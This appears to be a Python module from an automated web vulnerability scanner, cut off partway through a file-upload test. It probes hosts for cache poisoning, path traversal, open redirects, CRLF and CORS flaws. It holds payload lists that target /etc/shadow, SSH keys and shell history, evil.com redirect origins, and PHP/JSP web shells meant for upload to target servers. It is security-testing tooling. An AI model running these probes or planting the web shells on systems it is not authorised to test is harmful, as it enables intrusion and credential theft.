"""Client-side vulnerability phases: cache poisoning, LFI, open redirect, clickjacking, CRLF, CORS, file upload, CSP bypass, stored XSS."""
from reconchain.phases.helpers import *

_CACHE_POISON_HEADERS = ["X-Forwarded-Host", "X-Host", "X-Forwarded-Scheme", "X-Original-URL", "X-Rewrite-URL"]
_CACHE_KEY_DISCLOSURE_HEADERS = ["Pragma: x-get-cache-key", "X-Cache-Key", "X-Cache-Path", "X-Cache-Params"]

async def phase_28_CACHED(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"28-CACHED"}:
        return {}
    _out = outdir / "cache_poison.txt"
    if _out.exists() and not force:
        return {"28-CACHED": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 28-CACHED: web cache poisoning/deception probes")
    findings: List[str] = []
    cp_urlopen = _get_urlopener()
    _cp_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "host_targets.txt"
    if not hosts_file.exists():
        hosts_file = outdir / "hosts.txt"
    targets = [f"https://{h}" if not h.startswith("http") else h
               for h in read_lines(hosts_file)][:_PIPELINE_CFG.sample_hosts_cached]
    if not targets:
        log("warn", "28-CACHED: no HTTP targets; skipping")
        return {"28-CACHED": str(_out), "count": 0}
    async def _probe_cached(url: str) -> List[str]:
        results: List[str] = []
        try:
            base_req = urllib.request.Request(url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_cp_extra_headers})
            base_status, base_headers, base_body = await _async_urlopen(cp_urlopen, base_req, timeout=10)
            base_cached = "x-cache" in str(base_headers).lower() or "age:" in str(base_headers).lower() or "cf-cache" in str(base_headers).lower()
            if not base_cached:
                return results
            results.append(f"[cache-detected] {url} — caching headers present")
            for hdr in _CACHE_POISON_HEADERS:
                try:
                    poison_req = urllib.request.Request(url, method="GET",
                        headers={"User-Agent": "Mozilla/5.0", hdr: "evil.example.com", **_cp_extra_headers})
                    p_status, p_headers, p_body = await _async_urlopen(cp_urlopen, poison_req, timeout=10)
                    p_str = str(p_headers).lower()
                    if "evil.example.com" in p_str:
                        results.append(f"[cache-poison-candidate] {url} via {hdr}: evil.example.com reflected in headers")
                        break
                except Exception:
                    continue
            for dhdr in _CACHE_KEY_DISCLOSURE_HEADERS:
                try:
                    d_req = urllib.request.Request(url, method="GET",
                        headers={"User-Agent": "Mozilla/5.0", dhdr: "1", **_cp_extra_headers})
                    _, d_headers, d_body = await _async_urlopen(cp_urlopen, d_req, timeout=10)
                    d_str = str(d_headers).lower() + d_body.decode("utf-8", errors="ignore").lower()
                    if "cache-key" in d_str:
                        results.append(f"[cache-key-disclosure] {url} via {dhdr}")
                except Exception:
                    continue
            # X-Original-URL / X-Rewrite-URL / X-HTTP-Method-Override
            for alt_hdr in ["X-Original-URL", "X-Rewrite-URL", "X-HTTP-Method-Override"]:
                try:
                    alt_req = urllib.request.Request(url + "/nonexistent-cache-test", method="GET",
                        headers={"User-Agent": "Mozilla/5.0", alt_hdr: "/admin", **_cp_extra_headers})
                    _, alt_headers, _ = await _async_urlopen(cp_urlopen, alt_req, timeout=10)
                    if "x-cache" in str(alt_headers).lower() or "age:" in str(alt_headers).lower():
                        results.append(f"[cache-deception-candidate] {url} via {alt_hdr}: /admin")
                except Exception:
                    pass
            # Web Cache Deception: append static extensions
            base_body_lower = base_body.decode("utf-8", errors="ignore").lower() if base_body else ""
            for ext in [".css", ".js", ".png"]:
                try:
                    wcd_url = url.rstrip("/") + ext
                    wcd_req = urllib.request.Request(wcd_url, method="GET",
                        headers={"User-Agent": "Mozilla/5.0", **_cp_extra_headers})
                    _, wcd_headers, wcd_body = await _async_urlopen(cp_urlopen, wcd_req, timeout=10)
                    wcd_str = str(wcd_headers).lower()
                    if ("x-cache" in wcd_str or "age:" in wcd_str) and wcd_body:
                        wcd_body_lower = wcd_body.decode("utf-8", errors="ignore").lower()
                        if base_body_lower and wcd_body_lower and len(wcd_body_lower) > 50 and \
                           (wcd_body_lower.find("<!doctype") >= 0 or wcd_body_lower.find("<html") >= 0):
                            results.append(f"[wcd-candidate] {url}{ext} — static extension trick returns user data")
                except Exception:
                    continue
            # Cache key confusion: double-encoded params
            parsed = urllib.parse.urlparse(url)
            qs = parsed.query
            try:
                if qs:
                    double_enc_qs = urllib.parse.quote(qs)
                    conf_url = urllib.parse.urlunparse(parsed._replace(query=double_enc_qs))
                    conf_req = urllib.request.Request(conf_url, method="GET",
                        headers={"User-Agent": "Mozilla/5.0", **_cp_extra_headers})
                    _, conf_headers, conf_body = await _async_urlopen(cp_urlopen, conf_req, timeout=10)
                    if conf_body != base_body:
                        results.append(f"[cache-key-confusion] {url} — double-encoded param produces different response")
            except Exception:
                pass
            try:
                if qs:
                    semi_qs = qs.replace("&", ";")
                    semi_url = urllib.parse.urlunparse(parsed._replace(query=semi_qs))
                    semi_req = urllib.request.Request(semi_url, method="GET",
                        headers={"User-Agent": "Mozilla/5.0", **_cp_extra_headers})
                    _, semi_headers, semi_body = await _async_urlopen(cp_urlopen, semi_req, timeout=10)
                    if semi_body != base_body:
                        results.append(f"[cache-key-confusion] {url} — semicolons produce different cache key")
            except Exception:
                pass
            try:
                post_req = urllib.request.Request(url, method="POST", data=b"",
                    headers={"User-Agent": "Mozilla/5.0", **_cp_extra_headers})
                po_status, po_headers, po_body = await _async_urlopen(cp_urlopen, post_req, timeout=10)
                if po_body == base_body and "x-cache" in str(po_headers).lower():
                    results.append(f"[cache-key-confusion] {url} — POST request produces same cache as GET")
            except Exception:
                pass
            # Mergeable params
            try:
                if qs:
                    parsed_qs = urllib.parse.parse_qs(qs, keep_blank_values=True)
                    if parsed_qs:
                        fst_key = next(iter(parsed_qs))
                        merge_qs = urllib.parse.urlencode({fst_key: ["1", "2"]}, doseq=True)
                        merge_url = urllib.parse.urlunparse(parsed._replace(query=merge_qs))
                        merge_req = urllib.request.Request(merge_url, method="GET",
                            headers={"User-Agent": "Mozilla/5.0", **_cp_extra_headers})
                        _, merge_headers, merge_body = await _async_urlopen(cp_urlopen, merge_req, timeout=10)
                        if merge_body != base_body:
                            results.append(f"[mergeable-params] {url} — param merging causes different response")
            except Exception:
                pass
            # Chunked encoding + cache
            try:
                chunked_req = urllib.request.Request(url, method="GET",
                    headers={"User-Agent": "Mozilla/5.0", "Transfer-Encoding": "chunked", "Content-Length": "0", **_cp_extra_headers})
                _, chunked_headers, _ = await _async_urlopen(cp_urlopen, chunked_req, timeout=10)
                if "x-cache" in str(chunked_headers).lower():
                    results.append(f"[chunked-cache] {url} — chunked encoding with Content-Length returns cached response")
            except Exception:
                pass
            # Cache TTL fingerprint
            try:
                ttl_req1 = urllib.request.Request(url, method="GET",
                    headers={"User-Agent": "Mozilla/5.0", **_cp_extra_headers})
                _, ttl_h1, _ = await _async_urlopen(cp_urlopen, ttl_req1, timeout=10)
                await asyncio.sleep(1)
                ttl_req2 = urllib.request.Request(url, method="GET",
                    headers={"User-Agent": "Mozilla/5.0", **_cp_extra_headers})
                _, ttl_h2, _ = await _async_urlopen(cp_urlopen, ttl_req2, timeout=10)
                age1 = ttl_h1.get("Age")
                age2 = ttl_h2.get("Age")
                if age1 is not None and age2 is not None:
                    try:
                        age_diff = int(age2) - int(age1)
                        if age_diff >= 0:
                            results.append(f"[cache-ttl] {url} — TTL ~{age_diff}s based on Age vs Date")
                    except (ValueError, TypeError):
                        pass
            except Exception:
                pass
        except Exception:
            pass
        return results
    cp_results = await asyncio.gather(*[_probe_cached(t) for t in targets])
    for cr in cp_results:
        findings.extend(cr)
    if not findings:
        findings.append("[cached] No cache poisoning candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"28-CACHED: {len(findings)} cache probes → {out}")
    return {"28-CACHED": str(out), "count": len(findings)}

async def phase_30_LFI(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"30-LFI"}:
        return {}
    _out = outdir / "lfi.txt"
    if _out.exists() and not force:
        return {"30-LFI": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 30-LFI: path traversal / local file inclusion probes")
    findings: List[str] = []
    _lfi_urlopen = _get_urlopener()
    _lfi_extra_headers = _extra_headers_dict()
    urls_file = outdir / "urls_all.txt"
    all_urls = read_lines(urls_file) if urls_file.exists() else []
    if not all_urls:
        log("warn", "30-LFI: no URLs; skipping")
        return {"30-LFI": str(_out), "count": 0}
    # Identify file-read parameters
    file_params = ["file", "page", "template", "include", "path", "doc", "document",
                   "folder", "root", "load", "read", "dir", "show", "view",
                   "content", "editor", "preview", "resource", "config",
                   "language", "lang", "style", "template", "plugin"]
    param_urls = [
        u for u in all_urls
        if "=" in u and not _is_static_url(u) and any(f"{p}=" in u.lower() for p in file_params)
    ]
    if not param_urls:
        param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)]
    param_urls = param_urls[:_PIPELINE_CFG.sample_urls_lfi]
    if not param_urls:
        log("warn", "30-LFI: no parameter-bearing URLs; skipping")
        return {"30-LFI": str(_out), "count": 0}
    findings.append(f"target_urls={len(param_urls)}")
    lfi_payloads = [
        "/etc/passwd",
        "/etc/passwd%00",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "../../../windows/win.ini",
        "/etc/shadow",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/fd/0",
        "/var/log/apache/access.log",
        "/var/log/apache2/access.log",
        "/var/log/httpd/access_log",
        "/var/log/nginx/access.log",
        "/etc/issue",
        "/etc/hosts",
        "/etc/hostname",
        "/etc/resolv.conf",
        "/etc/ssh/sshd_config",
        "/root/.bash_history",
        "/home/ubuntu/.bash_history",
        "/home/admin/.ssh/id_rsa",
        "/home/ubuntu/.ssh/authorized_keys",
        "/var/www/html/config.php",
        "/var/www/config.php",
        "/var/www/application/config/database.php",
        "/web.config",
        "/WEB-INF/web.xml",
        "/WEB-INF/db.properties",
    ]
    lfi_indicators = [
        "root:", "root:x:", "daemon:", "bin:", "sys:", "nobody:",
        "[extensions]", "[fonts]", "load average", "uptime",
        "www-data", "wwwrun", "localhost", "nameserver",
        "ssh-rsa", "ssh-dss", "BEGIN RSA PRIVATE KEY",
        "MIIE", "mysql:", "postgres:", "admin:",
        "windowssystem32", "[drivers]", "running kernel",
        "<configuration>", "<web-app", "<?xml ",
    ]
    async def _probe_lfi(url: str) -> List[str]:
        results: List[str] = []
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            return results
        base_len = None
        try:
            base_req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_lfi_extra_headers})
            _, _, base_body = await _async_urlopen(_lfi_urlopen, base_req, timeout=10)
            base_len = len(base_body)
        except Exception:
            pass
        for pname in qs:
            if not any(fp in pname.lower() for fp in file_params):
                continue
            for payload in lfi_payloads[:min(len(lfi_payloads), 10)]:
                await _throttle_rate()
                encoded_payload = urllib.parse.quote(payload, safe='')
                query_parts = []
                for k, vals in qs.items():
                    for v in vals:
                        if k == pname:
                            query_parts.append(f"{urllib.parse.quote_plus(k)}={encoded_payload}")
                        else:
                            query_parts.append(f"{urllib.parse.quote_plus(k)}={urllib.parse.quote_plus(v)}")
                new_qs = '&'.join(query_parts)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_lfi_extra_headers})
                    lfi_status, _, lfi_body = await _async_urlopen(_lfi_urlopen, req, timeout=10)
                    body_text = lfi_body.decode("utf-8", errors="ignore")
                    if any(ind in body_text for ind in lfi_indicators):
                        results.append(f"[lfi-confirmed] {test_url} → param={pname} payload={payload}")
                        # Show first 3 lines of response as evidence
                        for sample_line in body_text.splitlines()[:3]:
                            if sample_line.strip():
                                results.append(f"  {sample_line[:200]}")
                    elif lfi_status == 200 and base_len is not None and abs(len(lfi_body) - base_len) > max(300, base_len * 0.2):
                        results.append(f"[lfi-candidate] {test_url} → param={pname} payload={payload} len={len(lfi_body)}")
                except Exception:
                    continue
        return results
    probe_results = await asyncio.gather(*[_probe_lfi(u) for u in param_urls])
    for pr in probe_results:
        findings.extend(pr)
    if not findings:
        findings.append("[result] No LFI vulnerabilities detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"30-LFI: {len(findings)} findings → {out}")
    return {"30-LFI": str(_out), "count": len(findings)}

_OPENREDIR_PAYLOADS = [
    ("url", "https://evil.com"),
    ("next", "https://evil.com"),
    ("redirect", "https://evil.com"),
    ("redirect_uri", "https://evil.com"),
    ("return", "https://evil.com"),
    ("return_to", "https://evil.com"),
    ("return_url", "https://evil.com"),
    ("target", "https://evil.com"),
    ("dest", "https://evil.com"),
    ("destination", "https://evil.com"),
    ("redir", "https://evil.com"),
    ("redirect_url", "https://evil.com"),
    ("rurl", "https://evil.com"),
    ("link", "https://evil.com"),
    ("goto", "https://evil.com"),
    ("out", "https://evil.com"),
    ("view", "https://evil.com"),
    ("file", "https://evil.com"),
    ("load", "https://evil.com"),
    ("path", "//evil.com"),
    ("url", "//evil.com"),
    ("next", "//evil.com"),
]


async def phase_31_OPENREDIR(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"31-OPENREDIR"}:
        return {}
    _out = outdir / "open_redirect.txt"
    if _out.exists() and not force:
        return {"31-OPENREDIR": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 31-OPENREDIR: open redirect detection")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "31-OPENREDIR: no URLs; skipping")
        return {"31-OPENREDIR": str(_out), "count": 0}
    findings: List[str] = []
    _or_urlopen = _get_urlopener()
    _or_extra_headers = _extra_headers_dict()
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][:_PIPELINE_CFG.sample_urls_redirect]
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for param_name in qs:
            if param_name.lower() in _SKIP_PARAMS:
                continue
            for target_param, redirect_val in _OPENREDIR_PAYLOADS:
                if param_name.lower() == target_param:
                    test_qs = qs.copy()
                    test_qs[param_name] = [redirect_val]
                    new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                    test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                    try:
                        req = urllib.request.Request(test_url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_or_extra_headers})
                        resp_status, resp_headers, _ = await _async_urlopen_no_redirect(_or_urlopen, req, timeout=10)
                        location = resp_headers.get("Location", "")
                        if not location:
                            location = resp_headers.get("location", "")
                        if "evil.com" in location or "//evil.com" in location:
                            findings.append(f"[open-redirect] {test_url} -> {location} (HTTP {resp_status})")
                    except urllib.error.HTTPError as e:
                        location = e.headers.get("Location", "") or e.headers.get("location", "")
                        if "evil.com" in location or "//evil.com" in location:
                            findings.append(f"[open-redirect] {test_url} -> {location} (HTTP {e.code})")
                    except Exception:
                        continue
    if not findings:
        findings.append("[open-redirect] No open redirect candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"31-OPENREDIR: {len(findings)} open redirect probes -> {out}")
    return {"31-OPENREDIR": str(out), "count": len(findings)}

_CLICKJACK_HEADERS_TO_CHECK = ["X-Frame-Options", "Content-Security-Policy"]


async def phase_32_CLICKJACK(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"32-CLICKJACK"}:
        return {}
    _out = outdir / "clickjacking.txt"
    if _out.exists() and not force:
        return {"32-CLICKJACK": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 32-CLICKJACK: clickjacking protection detection")
    findings: List[str] = []
    _cj_urlopen = _get_urlopener()
    _cj_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "host_targets.txt"
    if not hosts_file.exists():
        hosts_file = outdir / "hosts.txt"
    targets = [f"https://{h}" if not h.startswith("http") else h
               for h in read_lines(hosts_file)][:_PIPELINE_CFG.sample_hosts_clickjack]
    if not targets:
        log("warn", "32-CLICKJACK: no HTTP targets; skipping")
        return {"32-CLICKJACK": str(_out), "count": 0}
    for url in targets:
        try:
            req = urllib.request.Request(url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_cj_extra_headers})
            _, resp_headers, _ = await _async_urlopen(_cj_urlopen, req, timeout=10)
            xfo = resp_headers.get("X-Frame-Options", "")
            csp = resp_headers.get("Content-Security-Policy", "")
            has_xfo = bool(xfo)
            has_frame_ancestors = "frame-ancestors" in csp
            if not has_xfo and not has_frame_ancestors:
                findings.append(f"[clickjacking-missing] {url} — no X-Frame-Options or CSP frame-ancestors")
            elif not has_xfo:
                findings.append(f"[clickjacking-csp-only] {url} — CSP frame-ancestors present but no X-Frame-Options")
        except Exception:
            continue
    if not findings:
        findings.append("[clickjacking] All targets have clickjacking protection (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"32-CLICKJACK: {len(findings)} clickjacking checks -> {out}")
    return {"32-CLICKJACK": str(out), "count": len(findings)}

_CRLF_PAYLOADS = [
    ("\r\nX-Injected: yes", "X-Injected"),
    ("\r\nX-Injected: yes\r\n", "X-Injected"),
    ("\nX-Injected: yes", "X-Injected"),
    ("\r\n\r\n<html>injected</html>", "injected"),
    ("\r\nSet-Cookie: crlf=injected", "crlf=injected"),
]


async def phase_33_CRLF(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"33-CRLF"}:
        return {}
    _out = outdir / "crlf_injection.txt"
    if _out.exists() and not force:
        return {"33-CRLF": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 33-CRLF: CRLF injection / HTTP response splitting")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "33-CRLF: no URLs; skipping")
        return {"33-CRLF": str(_out), "count": 0}
    findings: List[str] = []
    _crlf_urlopen = _get_urlopener()
    _crlf_extra_headers = _extra_headers_dict()
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][:_PIPELINE_CFG.sample_urls_crlf]
    if t.has("crlfuzz") and param_urls:
        crlfuzz_in = ensure(outdir / "crlfuzz_input.txt")
        crlfuzz_in.write_text("\n".join(param_urls) + "\n")
        crlfuzz_out = outdir / "crlfuzz_results.txt"
        runner = outdir / "logs" / "crlfuzz_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"IN={shlex.quote(str(crlfuzz_in))}\n"
            f"OUT={shlex.quote(str(crlfuzz_out))}\n"
            'crlfuzz -l "$IN" -o "$OUT"\n'
        )
        runner.chmod(0o700)
        await _run("crlfuzz", ["bash", str(runner)], 600, outdir)
        if crlfuzz_out.exists() and read_lines(crlfuzz_out):
            for ln in read_lines(crlfuzz_out):
                findings.append(f"[crlfuzz] {ln.strip()}")
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for param_name in qs:
            if param_name.lower() in _SKIP_PARAMS:
                continue
            for payload, indicator in _CRLF_PAYLOADS:
                test_qs = qs.copy()
                test_qs[param_name] = [payload]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(test_url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_crlf_extra_headers})
                    resp_status, resp_headers, resp_body = await _async_urlopen_no_redirect(_crlf_urlopen, req, timeout=10)
                    body_str = resp_body.decode("utf-8", errors="ignore")
                    headers_str = str(resp_headers).lower()
                    if indicator in body_str or indicator.lower() in headers_str:
                        findings.append(f"[crlf-injection] {test_url} via {param_name} payload={payload} -> {indicator} reflected")
                except urllib.error.HTTPError as e:
                    try:
                        body = e.read().decode("utf-8", errors="ignore")
                        if indicator in body:
                            findings.append(f"[crlf-injection] {test_url} via {param_name} payload={payload} -> {indicator} in error body")
                    except Exception:
                        pass
                except Exception:
                    continue
    if not findings:
        findings.append("[crlf] No CRLF injection candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"33-CRLF: {len(findings)} CRLF probes -> {out}")
    return {"33-CRLF": str(out), "count": len(findings)}

async def phase_34_RATELIMIT(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"34-RATELIMIT"}:
        return {}
    _out = outdir / "rate_limiting.txt"
    if _out.exists() and not force:
        return {"34-RATELIMIT": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 34-RATELIMIT: rate limiting / brute-force protection detection")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "34-RATELIMIT: no URLs; skipping")
        return {"34-RATELIMIT": str(_out), "count": 0}
    findings: List[str] = []
    _rl_urlopen = _get_urlopener()
    _rl_extra_headers = _extra_headers_dict()
    _burst_size = 10 if (_PIPELINE_CFG.proxy or _USE_PROXYCHAINS) else 50
    login_targets = [u for u in all_urls if any(m in u.lower() for m in
        ("/login", "/signin", "/auth", "/oauth", "/token", "/api/"))][:_PIPELINE_CFG.sample_hosts_ratelimit]
    if not login_targets:
        login_targets = all_urls[:_PIPELINE_CFG.sample_hosts_ratelimit]
    for url in login_targets:
        try:
            statuses: List[int] = []
            for _ in range(_burst_size):
                await _throttle_rate()
                req = urllib.request.Request(url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_rl_extra_headers})
                s, resp_h, _ = await _async_urlopen_no_redirect(_rl_urlopen, req, timeout=8)
                statuses.append(s)
                if s in (429, 503) or "retry-after" in str(resp_h).lower():
                    findings.append(f"[rate-limit-detected] {url} — rate limited after {len(statuses)} requests (HTTP {s})")
                    break
            else:
                unique_st = len(set(statuses))
                rate_limited = any(s in (429, 503) for s in statuses)
                if len(statuses) >= _burst_size and not rate_limited:
                    findings.append(f"[rate-limit-missing] {url} — no rate limiting after {_burst_size} requests")
        except Exception:
            continue
    if not findings:
        findings.append("[rate-limit] No rate limiting checks completed")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"34-RATELIMIT: {len(findings)} rate limit checks -> {out}")
    return {"34-RATELIMIT": str(out), "count": len(findings)}


# ────────────────── Phase 35-CORSADV: Advanced CORS Testing ────────────────────
async def phase_35_CORSADV(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"35-CORSADV"}:
        return {}
    _out = outdir / "cors_advanced.txt"
    if _out.exists() and not force:
        return {"35-CORSADV": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 35-CORSADV: advanced CORS misconfiguration testing")
    findings: List[str] = []
    _cors_urlopen = _get_urlopener()
    _cors_extra_headers = _extra_headers_dict()
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    api_endpoints = list({u for u in all_urls
        if any(m in u.lower() for m in ("/api/", "/v1/", "/v2/", "/graphql"))})[:_PIPELINE_CFG.sample_endpoints_corsadv]
    if not api_endpoints:
        api_endpoints = list(all_urls)[:_PIPELINE_CFG.sample_endpoints_corsadv]
    if not api_endpoints:
        log("warn", "35-CORSADV: no endpoints; skipping")
        return {"35-CORSADV": str(_out), "count": 0}
    # Corsy CORS misconfiguration scanner
    if t.has("corsy") and api_endpoints:
        corsy_in = ensure(outdir / "corsy_input.txt")
        corsy_in.write_text("\n".join(api_endpoints) + "\n")
        corsy_out = outdir / "corsy_results.txt"
        runner = outdir / "logs" / "corsy_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"IN={shlex.quote(str(corsy_in))}\n"
            f"OUT={shlex.quote(str(corsy_out))}\n"
            'corsy -i "$IN" -o "$OUT"\n'
        )
        runner.chmod(0o700)
        await _run("corsy", ["bash", str(runner)], 600, outdir)
        if corsy_out.exists() and read_lines(corsy_out):
            for ln in read_lines(corsy_out):
                findings.append(f"[corsy] {ln.strip()}")
    _CORS_TEST_ORIGINS = [
        "https://evil.com",
        "https://sub.evil.com",
        "null",
        "https://evil.com:8080",
        "https://evil.com.evil2.com",
        "https://evil.com%2f.evil2.com",
    ]
    async def _check_cors_origin(url: str, origin: str) -> Optional[str]:
        try:
            req = urllib.request.Request(url, method="OPTIONS",
                headers={"User-Agent": "Mozilla/5.0", "Origin": origin, **_cors_extra_headers})
            _, ch, _ = await _async_urlopen_no_redirect(_cors_urlopen, req, timeout=8)
            acao = ch.get("Access-Control-Allow-Origin", "")
            acac = ch.get("Access-Control-Allow-Credentials", "")

            if origin in acao or "*" in acao:
                creds = " with credentials" if acac == "true" else ""
                return f"[cors-misconfig] {url} ACAO={acao} origin={origin}{creds}"
            if origin and origin.lower() in str(ch).lower() and origin != "null":
                return f"[cors-origin-reflection] {url} origin={origin} reflected in headers"
        except Exception:
            pass
        return None
    cors_results = await asyncio.gather(*[_check_cors_origin(ep, o)
        for ep in api_endpoints for o in _CORS_TEST_ORIGINS])
    for r in cors_results:
        if r:
            findings.append(r)
    # ── JSONP endpoint detection ──
    jsonp_endpoints: Set[str] = set()
    jsonp_params = {"callback=", "jsonp=", "cb=", "jsoncallback="}
    for u in all_urls:
        qs = urllib.parse.urlparse(u).query
        if qs and any(p in qs.lower() for p in jsonp_params):
            jsonp_endpoints.add(u.split("?")[0])
    for ep in list(jsonp_endpoints)[:10]:
        try:
            test_val = "jQuery1234_test"
            jsonp_url = f"{ep}?callback={test_val}"
            req = urllib.request.Request(jsonp_url, method="GET",
                headers={"User-Agent": "Mozilla/5.0", **_cors_extra_headers})
            _, _, body_bytes = await _async_urlopen_no_redirect(_cors_urlopen, req, timeout=8)
            body = body_bytes.decode("utf-8", errors="ignore")
            if test_val in body and ("(" in body and ")" in body):
                findings.append(f"[jsonp-endpoint] {ep} — callback param reflected with wrapping (JSONP)")
                inject_val = "alert(1)"
                inject_url = f"{ep}?callback={inject_val}"
                ireq = urllib.request.Request(inject_url, method="GET",
                    headers={"User-Agent": "Mozilla/5.0", **_cors_extra_headers})
                _, _, ibody_bytes = await _async_urlopen_no_redirect(_cors_urlopen, ireq, timeout=8)
                ibody = ibody_bytes.decode("utf-8", errors="ignore")
                if inject_val in ibody and not ibody.startswith("//") and not ibody.startswith("/**"):
                    findings.append(f"[jsonp-injectable] {ep} — callback value injectable into response (XSS/CSRF)")
                findings.append(f"[jsonp-legacy] {ep} — JSONP callback present; legacy API may be exploitable from any origin")
        except Exception:
            continue

    if not findings:
        findings.append("[cors] No advanced CORS misconfigurations detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"35-CORSADV: {len(findings)} CORS checks -> {out}")
    return {"35-CORSADV": str(out), "count": len(findings)}

_FILEUPLOAD_TEST_FILES = [
    ("php_webshell.php", "<?php system($_GET['cmd']); ?>", "text/plain"),
    ("test.jsp", "<%= Runtime.getRuntime().exec(request.getParameter(\"cmd\")) %>", "text/plain"),
    ("test.aspx", "<%@ Page Language=\"C#\" %><%= Request.QueryString[\"cmd\"] %>", "text/plain"),
    ("test.php5", "<?php echo 'test'; ?>", "image/jpeg"),
    ("test.phtml", "<?php echo 'test'; ?>", "image/png"),
    ("test.cgi", "#!/bin/bash\necho 'test'", "text/plain"),
    ("test.svg", "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>", "image/svg+xml"),
    ("test.html", "<script>alert(document.cookie)</script>", "text/html"),
    ("test.htaccess", "AddType application/x-httpd-php .txt", "text/plain"),
    ("test.zip", "PK", "application/zip"),
]


async def phase_37_FILEUPLOAD(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"37-FILEUPLOAD"}:
        return {}
    _out = outdir / "file_upload.txt"
    if _out.exists() and not force:
        return {"37-FILEUPLOAD": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 37-FILEUPLOAD: file upload vulnerability testing")
    findings: List[str] = []
    upload_urlopen = _get_urlopener()
    _fu_extra_headers = _extra_headers_dict()
    upload_candidates: Set[str] = set()
    urls_file = outdir / "urls_all.txt"
    if urls_file.exists():
        for u in read_lines(urls_file):
            low = u.lower()
            if any(m in low for m in ("/upload", "/file", "/import", "/attach", "/media", "/image")):
                upload_candidates.add(u.split("?")[0])
    fuzz_file = outdir / "fuzz.txt"
    if fuzz_file.exists():
        for ln in read_lines(fuzz_file):
            low = ln.lower()
            if any(m in low for m in ("/upload", "/file", "/import", "/attach", "/media", "/image")):
                upload_candidates.add(ln.split("\t")[-1] if "\t" in ln else (ln.split()[0] if " " in ln else ln))
    targets = list(upload_candidates)[:_PIPELINE_CFG.sample_urls_upload]
    if not targets:
        log("warn", "37-FILEUPLOAD: no upload endpoints found; skipping")
        return {"37-FILEUPLOAD": str(_out), "count": 0}
    for ep in targets:
        for fname, content, content_type in _FILEUPLOAD_TEST_FILES:
            try:
                boundary = "----WebKitFormBoundary" + base64.b64encode(os.urandom(16)).decode()
